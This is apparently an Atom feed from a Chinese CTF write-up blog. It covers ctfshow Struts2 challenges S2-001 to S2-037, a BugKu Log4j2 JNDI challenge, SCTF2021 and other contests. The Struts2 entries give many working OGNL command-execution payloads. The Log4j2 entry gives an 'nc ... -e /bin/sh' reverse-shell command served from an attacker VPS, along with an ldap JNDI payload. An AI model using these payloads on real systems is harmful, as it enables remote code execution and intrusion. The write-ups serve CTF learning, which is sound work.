<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>1__/\/のblog</title>
  
  <subtitle>LN</subtitle>
  <link href="http://lll-nnn.github.io/atom.xml" rel="self"/>
  
  <link href="http://lll-nnn.github.io/"/>
  <updated>2022-01-09T08:58:52.830Z</updated>
  <id>http://lll-nnn.github.io/</id>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Strut-S2-</title>
    <link href="http://lll-nnn.github.io/2022/01/08/Strut-S2-001/"/>
    <id>http://lll-nnn.github.io/2022/01/08/Strut-S2-001/</id>
    <published>2022-01-08T14:30:25.000Z</published>
    <updated>2022-01-09T08:58:52.830Z</updated>
    
    <content type="html"><![CDATA[<h2 id="web279"><a href="#web279" class="headerlink" title="web279"></a>web279</h2><p><code>S2-001</code>是struts漏洞的编号</p><p>Struts2是用java语言编写的一个基于MVC设计模式的Web应用框架<br>判断是否为Strut2框架：</p><ul><li>通过页面回显的错误消息来判断，页面不回显错误消息时则无效。</li><li>通过网页后缀来判断，如.do .action，有可能不准。</li><li>判断 /struts/webconsole.html 是否存在来进行判断，需要 devMode 为 true。<br><a href="https://blog.csdn.net/qq_27446553/article/details/73639456">MORE</a></li></ul><blockquote><p>struts2漏洞 S2-001是当用户提交表单数据且验证失败时，服务器使用OGNL表达式解析用户先前提交的参数值，%{value}并重新填充相应的表单数据</p></blockquote><blockquote><p>OGNL是Object-Graph Navigation Language的缩写，它是一种功能强大的表达式语言，通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。</p></blockquote><p>OGNL表达式中</p><ul><li><code>%</code>   的用途是在标志的属性为字符串类型时，计算OGNL表达式%{}中的值</li><li><code>#</code>   的用途访主要是访问非根对象属性，因为Struts 2中值栈被视为根对象，所以访问其他非根对象时，需要加#前缀才可以调用</li><li><code>$</code>   主要是在Struts 2配置文件中，引用OGNL表达式</li></ul><p>payload:</p><pre><code>//获取tomact路径%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;//获取web路径%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#39;/&#39;)),#response.flush(),#response.close()&#125;//命令执行%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;env&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;&amp;username=1</code></pre><p>flag再env中<br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201082249732.png"><br>或者直接用工具打<br><a href="https://github.com/HatBoy/Struts2-Scan">https://github.com/HatBoy/Struts2-Scan</a><br>检测<code>python .\Struts2Scan.py -u http://5f3afd6b-33da-45f2-9367-4dd742779ca9.challenge.ctf.show/S2-001/login.action</code><br>命令执行<code>python .\Struts2Scan.py -u http://5f3afd6b-33da-45f2-9367-4dd742779ca9.challenge.ctf.show/S2-001/login.action -n S2-001 --exec</code></p><h2 id="web280"><a href="#web280" class="headerlink" title="web280"></a>web280</h2><p><code>S2-003</code></p><blockquote><p>Struts2将HTTP的每个参数名解析为ognl语句执行,而ognl表达式是通过<code>#</code>来访问struts的对象，Struts2框架虽然过滤了<code>#</code>来进行过滤，但是可以通过<code>unicode</code>编码（u0023）或<code>8进制</code>（43）绕过了安全限制，达到代码执行的效果</p></blockquote><blockquote><p>影响版本：Struts 2.0.0 - Struts 2.0.11.2</p></blockquote><p><code>S2-005</code></p><blockquote><p>S2-005和S2-003的原理是类似的，因为官方在修补S2-003不全面，导致用户可以绕过官方的安全配置（禁止静态方法调用和类方法执行），再次造成的漏洞，可以说是升级版的S2-005是升级版的S2-003</p></blockquote><blockquote><p>影响版本：Struts 2.0.0 - Struts 2.1.8.1</p></blockquote><p>工具打</p><h2 id="web281"><a href="#web281" class="headerlink" title="web281"></a>web281</h2><p><code>S2-007</code></p><blockquote><p>当配置了验证规则 <code>&lt;ActionName&gt;-validation.xml</code> 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回<br>影响版本：Struts2 2.0.0 - Struts2 2.2.3</p></blockquote><p>payload:</p><blockquote><p><code>&#39; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream())) + &#39;</code></p></blockquote><h2 id="web282"><a href="#web282" class="headerlink" title="web282"></a>web282</h2><p><code>S2-008</code></p><blockquote><p>S2-008有两个洞，一个是cookie处，另一个是在开启devMode模式后的调试接口能够命令执行</p></blockquote><p>姿势2：<br>payload：</p><blockquote><p><code>devmode.action?debug=command&amp;expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27env%27%29.getInputStream%28%29%29)</code></p></blockquote><p>姿势1：<br>payload：</p><blockquote><p><code>Cookie:(&#39;#_memberAccess.setAllowStaticMethodAccess(true)&#39;)(1)(2)=Aluvion; (&#39;@java.lang.Runtime@getRuntime().exec(&quot;env&quot;)&#39;)(1)(2)=Twings;</code></p></blockquote><p>不过没成功</p><p>工具打</p><h2 id="web283"><a href="#web283" class="headerlink" title="web283"></a>web283</h2><p><code>Struts2 showcase远程代码执行漏洞</code></p><p><code>S2-009</code><br>payload:</p><blockquote><p><code>/S2-009/ajax/example5.action?age=12313&amp;name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27env%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&amp;z[(name)(%27meh%27)]</code></p></blockquote><p>工具打</p><h2 id="web284"><a href="#web284" class="headerlink" title="web284"></a>web284</h2><p><code>S2-012</code></p><blockquote><p>  如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量，例如：</p></blockquote><pre><code>&lt;package name=&quot;S2-012&quot; extends=&quot;struts-default&quot;&gt;    &lt;action name=&quot;user&quot; class=&quot;com.demo.action.UserAction&quot;&gt;        &lt;result name=&quot;redirect&quot; type=&quot;redirect&quot;&gt;/index.jsp?name=$&#123;name&#125;&lt;/result&gt;        &lt;result name=&quot;input&quot;&gt;/index.jsp&lt;/result&gt;        &lt;result name=&quot;success&quot;&gt;/index.jsp&lt;/result&gt;    &lt;/action&gt;&lt;/package&gt;</code></pre><blockquote><p>这里 UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行<br>影响版本: 2.1.0 - 2.3.13</p></blockquote><p>payload:</p><pre><code>%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;, &quot;/etc/passwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</code></pre><h2 id="web285"><a href="#web285" class="headerlink" title="web285"></a>web285</h2><p><code>S2-013</code></p><pre><code>Struts2 标签中 &lt;s:a&gt; 和 &lt;s:url&gt; 都包含一个 includeParams 属性，其值可设置为 none，get 或 all，参考官方其对应意义如下：    none - 链接不包含请求的任意参数值（默认）    get - 链接只包含 GET 请求中的参数和其值    all - 链接包含 GET 和 POST 所有参数和其值&lt;s:a&gt;用来显示一个超链接，当includeParams=all的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。在放置参数的过程中会将参数进行OGNL渲染，造成任意命令执行漏洞影响版本：2.0.0 - 2.3.14.1</code></pre><p>payload:</p><blockquote><p><code>/link.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(&#39;env&#39;).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(&#39;dbapp%3D&#39;%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D</code></p></blockquote><p>工具打</p><h2 id="web286"><a href="#web286" class="headerlink" title="web286"></a>web286</h2><pre><code>漏洞产生于配置了 Action 通配符 *，并将其作为动态值时，解析时会将其内容执行 OGNL 表达式，例如：&lt;package name=&quot;S2-015&quot; extends=&quot;struts-default&quot;&gt;    &lt;action name=&quot;*&quot; class=&quot;com.demo.action.PageAction&quot;&gt;        &lt;result&gt;/&#123;1&#125;.jsp&lt;/result&gt;    &lt;/action&gt;&lt;/package&gt;上述配置能让我们访问 name.action 时使用 name.jsp 来渲染页面，但是在提取 name 并解析时，对其执行了 OGNL 表达式解析，所以导致命令执行。在实践复现的时候发现，由于 name 值的位置比较特殊，一些特殊的字符如 / &quot; / 都无法使用（转义也不行），所以在利用该点进行远程命令执行时一些带有路径的命令可能无法执行成功还有需要说明的就是在 Struts 2.3.14.1 - Struts 2.3.14.2 的更新内容中，删除了 SecurityMemberAccess 类中的 setAllowStaticMethodAccess 方法，因此在 2.3.14.2 版本以后都不能直接通过 #_memberAccess[&#39;allowStaticMethodAccess&#39;]=true 来修改其值达到重获静态方法调用的能力影响版本: 2.0.0 - 2.3.14.2</code></pre><p><code>http://d3a0fd25-58fe-4c11-a18f-99824e28344a.challenge.ctf.show/S2-015/$%7B1+1%7D.action</code></p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201091545469.png"></p><p>poc</p><blockquote><p><code>$&#123;#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=false,#m=#_memberAccess.getClass().getDeclaredField(&#39;allowStaticMethodAccess&#39;),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream()),#q&#125;.action</code></p></blockquote><p>url编码</p><blockquote><p><code>%24%7B%23context%5B&#39;xwork.MethodAccessor.denyMethodExecution&#39;%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass().getDeclaredField(&#39;allowStaticMethodAccess&#39;)%2C%23m.setAccessible(true)%2C%23m.set(%23_memberAccess%2Ctrue)%2C%23q%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(&#39;id&#39;).getInputStream())%2C%23q%7D.action%0A</code></p></blockquote><h2 id="web287"><a href="#web287" class="headerlink" title="web287"></a>web287</h2><pre><code>在struts2中，DefaultActionMapper类支持以&quot;action:&quot;、“redirect:”、&quot;redirectAction:&quot;作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令所以，访问http://your-ip:8080/index.action?redirect:OGNL表达式即可执行OGNL表达式影响版本: 2.0.0 - 2.3.15</code></pre><p>payload:</p><blockquote><p><code>redirect:%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22uname%20-a%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D</code></p></blockquote><h2 id="web288"><a href="#web288" class="headerlink" title="web288"></a>web288</h2><p><code>S2-019</code></p><p>poc</p><pre><code>?debug=command&amp;expression=#a=(new java.lang.ProcessBuilder(&#39;id&#39;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#out=#context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),#out.getWriter().println(new java.lang.String(#e)),#out.getWriter().flush(),#out.getWriter().close()// 利用是先进行url编码    与s2-008poc区别不同的仅仅是由原先的[“allowStaticMethodAccess”]=true静态方法执行改为(new java.lang.ProcessBuilder(‘id’)).start()，但该方法在虚空浪子心提出s2-012后不久就在博客里说明了官方修补方案将allowStaticMethodAccess取消了后的替补方法就是使用ava.lang.ProcessBuilder影响版本：Struts 2.0.0 - Struts 2.3.15.1</code></pre><h2 id="web289"><a href="#web289" class="headerlink" title="web289"></a>web289</h2><p><code>S2-029</code></p><pre><code>Struts框架被强制执行时，对分配给某些标签的属性值进行双重评估，因此可以传入一个值，当一个标签的属性将被渲染时，该值将被再次评估例如：代码执行过程大致为先尝试获取value的值，如果value为空，那么就二次解释执行了name。并且在执行前给name加上了”%&#123;&#125;”。最终造成二次执行影响版本：Struts 2.0.0 - Struts 2.3.24.1（2.3.20.3除外）</code></pre><p>poc:<code>default.action?message=(%23_memberAccess[&#39;allowPrivateAccess&#39;]=true,%23_memberAccess[&#39;allowProtectedAccess&#39;]=true,%23_memberAccess[&#39;excludedPackageNamePatterns&#39;]=%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;excludedClasses&#39;]=%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;allowPackageProtectedAccess&#39;]=true,%23_memberAccess[&#39;allowStaticMethodAccess&#39;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;env&#39;).getInputStream()))</code></p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201091614116.png"></p><h2 id="web290"><a href="#web290" class="headerlink" title="web290"></a>web290</h2><p><code>S2-032</code></p><pre><code>Struts2在开启了动态方法调用（Dynamic Method Invocation）的情况下，可以使用method:&lt;name&gt;的方式来调用名字是&lt;name&gt;的方法，而这个方法名将会进行OGNL表达式计算，导致远程命令执行漏洞影响版本: Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)</code></pre><p>poc:<code>?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp=\\A&amp;ppp= &amp;encoding=UTF-8&amp;cmd=env</code></p><h2 id="web291"><a href="#web291" class="headerlink" title="web291"></a>web291</h2><p><code>S2-033</code></p><pre><code>当开启动态方法调用，并且同时使用了Strut2 REST Plugin插件时，使用“!”操作符调用动态方法可能执行ognl表达式，导致代码执行影响版本：Struts 2.3.20 – Struts 2.3.28 (不包括 2.3.20.3和 2.3.24.3)</code></pre><p>poc:<code>/orders/4/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=2908&amp;command=env</code></p><h2 id="web292"><a href="#web292" class="headerlink" title="web292"></a>web292</h2><p><code>S2-037</code></p><pre><code>当使用REST插件启用动态方法调用时，可以传递可用于在服务器端执行任意代码的恶意表达式影响版本：Struts 2.3.20 - Struts Struts 2.3.28（2.3.20.3和2.3.24.3除外）</code></pre><p>poc:<code>/orders/3/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=2908&amp;command=env</code></p><h2 id="web298"><a href="#web298" class="headerlink" title="web298"></a>web298</h2><p><code>反编译</code></p><p>给了一个<code>war</code>包</p><p>用<a href="https://github.com/java-decompiler/jd-gui/releases"><code>Java decompiler</code></a></p><p>反编译</p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201091649320.png"></p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201091649164.png"><br>payload：<code>/ctfshow/login?username=admin&amp;password=ctfshow</code></p><hr><p><a href="https://blog.csdn.net/q20010619/article/details/120729447">MORE</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;web279&quot;&gt;&lt;a href=&quot;#web279&quot; class=&quot;headerlink&quot; title=&quot;web279&quot;&gt;&lt;/a&gt;web279&lt;/h2&gt;&lt;p&gt;&lt;code&gt;S2-001&lt;/code&gt;是struts漏洞的编号&lt;/p&gt;
&lt;p&gt;Struts2是用java语言</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="wp" scheme="http://lll-nnn.github.io/categories/CTF/wp/"/>
    
    <category term="ctfshow" scheme="http://lll-nnn.github.io/categories/CTF/wp/ctfshow/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="ctfshow" scheme="http://lll-nnn.github.io/tags/ctfshow/"/>
    
  </entry>
  
  <entry>
    <title>Log4j2</title>
    <link href="http://lll-nnn.github.io/2021/12/29/Log4j2/"/>
    <id>http://lll-nnn.github.io/2021/12/29/Log4j2/</id>
    <published>2021-12-29T11:28:38.000Z</published>
    <updated>2021-12-29T11:45:14.477Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Apache-Log4j2-RCE"><a href="#Apache-Log4j2-RCE" class="headerlink" title="Apache Log4j2 RCE"></a>Apache Log4j2 RCE</h2><p>BugKu:<a href="https://ctf.bugku.com/challenges/detail/id/340.html">https://ctf.bugku.com/challenges/detail/id/340.html</a><br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112291933557.png"><br>先dnslog看看<br><code>$&#123;jndi:ldap://hhkzdj.dnslog.cn&#125;</code><br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112291934351.png"><br>有回显，所以存在<code>Log4j2</code></p><p>需要先在自己VPS上搭建一个JNDI服务<br><code>Github: https://github.com/welk1n/JNDI-Injection-Exploit</code><br>git clone 下来</p><pre><code>1.cd JNDI-Injection-Exploit2.mvn clean package -DskipTests     //这一步报错的话直接下载作者给的jar包也行3.java -jar target/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;命令&quot; -A &quot;VPS_IP&quot;    //开启服务</code></pre><p><code>java -jar target/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;nc xxx.xxx.xxx.xxx 9999 -e /bin/sh&quot; -A xxx.xxx.xxx.xxx</code></p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112291941336.png"><br>选择一个<code>JNDI Links</code><br>如：<code>ldap://120.76.136.64:1389/idzbzl</code><br>payload:<code>$&#123;jndi:ldap://120.76.136.64:1389/idzbzl&#125;</code><br>监听端口即可</p><p>参考：<a href="http://vfree.ltd/index.php/archives/386.html">http://vfree.ltd/index.php/archives/386.html</a><br>    <a href="https://www.cnblogs.com/ktsm/p/15695560.html">https://www.cnblogs.com/ktsm/p/15695560.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Apache-Log4j2-RCE&quot;&gt;&lt;a href=&quot;#Apache-Log4j2-RCE&quot; class=&quot;headerlink&quot; title=&quot;Apache Log4j2 RCE&quot;&gt;&lt;/a&gt;Apache Log4j2 RCE&lt;/h2&gt;&lt;p&gt;BugKu:&lt;a h</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="wp" scheme="http://lll-nnn.github.io/categories/CTF/wp/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="bugku" scheme="http://lll-nnn.github.io/tags/bugku/"/>
    
  </entry>
  
  <entry>
    <title>SCTF2021</title>
    <link href="http://lll-nnn.github.io/2021/12/28/SCTF2021/"/>
    <id>http://lll-nnn.github.io/2021/12/28/SCTF2021/</id>
    <published>2021-12-28T02:43:52.000Z</published>
    <updated>2021-12-28T02:58:52.574Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Loginme"><a href="#Loginme" class="headerlink" title="Loginme"></a>Loginme</h2><p>签到go题</p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112281045198.png"><br>给了源码</p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112281046293.png"><br>需要从localhost访问<br><a href="https://pkg.go.dev/github.com/gin-gonic/gin#Context.ClientIP">https://pkg.go.dev/github.com/gin-gonic/gin#Context.ClientIP</a><br>这里</p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112281047584.png"><br>所以可以用<code>x-real-ip</code><br>然后GET传参age获取admin的password<br><code>age=&#123;&#123;$&#125;`或者`&#123;&#123;.Password&#125;&#125;</code><br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112281050227.png"></p><p><a href="https://team-su.github.io/passages/2021-12-25-SCTF/">Write ups of TEAM-SU</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Loginme&quot;&gt;&lt;a href=&quot;#Loginme&quot; class=&quot;headerlink&quot; title=&quot;Loginme&quot;&gt;&lt;/a&gt;Loginme&lt;/h2&gt;&lt;p&gt;签到go题&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://gitee.com/ll_nn/pic</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="wp" scheme="http://lll-nnn.github.io/categories/CTF/wp/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="SCTF2021" scheme="http://lll-nnn.github.io/tags/SCTF2021/"/>
    
  </entry>
  
  <entry>
    <title>摆烂杯</title>
    <link href="http://lll-nnn.github.io/2021/12/27/%E6%91%86%E7%83%82%E6%9D%AF/"/>
    <id>http://lll-nnn.github.io/2021/12/27/%E6%91%86%E7%83%82%E6%9D%AF/</id>
    <published>2021-12-27T09:50:45.000Z</published>
    <updated>2021-12-27T13:25:09.068Z</updated>
    
    <content type="html"><![CDATA[<h2 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h2><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112271752482.png"></p><p>输入后会将算式式输出</p><p><code>(1)**3+(1)**3+(1)**3=3</code></p><p>不能有0</p><p>构造<br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112271755579.png"><br>提交得到flag</p><h2 id="一行代码"><a href="#一行代码" class="headerlink" title="一行代码"></a>一行代码</h2><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">include</span> <span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'.'</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">eregi</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"ctfsho"</span><span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"ctfshow"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token single-quoted-string string">'w'</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'r'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token double-quoted-string string">"welcome2ctfshow"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$flag</span><span class="token punctuation">:</span><span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span></code></pre><p>需要各个表达式都为false才能得到flag</p><p>payload：<code>?id=a&amp;filename=data://text/plain;base64,d2VsY29tZTJjdGZzaG93t&amp;content=Wdasdasfas</code></p><p><a href="https://qgieod1s9b.feishu.cn/docs/doccnC4EpMhSv1Ni6mbL7BQQdBc#">摆烂杯WP</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;web签到&quot;&gt;&lt;a href=&quot;#web签到&quot; class=&quot;headerlink&quot; title=&quot;web签到&quot;&gt;&lt;/a&gt;web签到&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://gitee.com/ll_nn/pic/raw/master/img/20211</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="wp" scheme="http://lll-nnn.github.io/categories/CTF/wp/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="摆烂杯" scheme="http://lll-nnn.github.io/tags/%E6%91%86%E7%83%82%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>金盾杯2021</title>
    <link href="http://lll-nnn.github.io/2021/12/12/%E9%87%91%E7%9B%BE%E6%9D%AF2021/"/>
    <id>http://lll-nnn.github.io/2021/12/12/%E9%87%91%E7%9B%BE%E6%9D%AF2021/</id>
    <published>2021-12-12T15:18:53.000Z</published>
    <updated>2021-12-12T15:44:32.589Z</updated>
    
